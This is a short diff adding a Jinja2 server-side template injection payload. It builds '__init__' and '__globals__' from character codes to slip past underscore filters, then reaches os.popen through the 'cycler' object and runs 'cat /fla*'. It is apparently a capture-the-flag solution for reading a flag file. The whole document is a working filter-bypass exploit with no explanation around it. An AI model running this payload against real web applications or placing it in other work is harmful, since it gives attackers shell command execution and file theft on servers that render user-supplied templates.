@@ -1,0 +1,4 @@
+{% set u = '%c'|format(95) %}
+{% set init = u+u+'init'+u+u %}
+{% set globals = u+u+'globals'+u+u %}
+{{ cycler[init][globals]["o"~"s"]["popen"]("cat /fla*")["read"]() }}
